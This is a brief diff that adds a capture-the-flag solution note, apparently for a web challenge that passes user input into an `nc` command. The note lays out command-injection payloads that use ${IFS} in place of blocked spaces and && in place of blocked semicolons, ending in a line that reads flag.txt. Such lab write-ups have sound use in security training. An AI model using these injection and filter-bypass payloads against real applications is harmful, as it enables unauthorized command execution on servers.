@@ -1,0 +1,11 @@
+# solution
+- find command called in source code: `nc -zv <url> 80 2>&1`
+- injection
+  - close nc command properly -> add `80`
+  - at the end, add a command to handle the `80 2>&1` added by the script -> e.g. echo
+- bypass filters
+  - space is blocked -> use ${IFS}
+  - ; is blocked -> use &&
+- set value in option to:
+  - `twitter.com${IFS}80&&ls&&echo`
+  - `twitter.com${IFS}80&&cat${IFS}flag.txt&&echo`
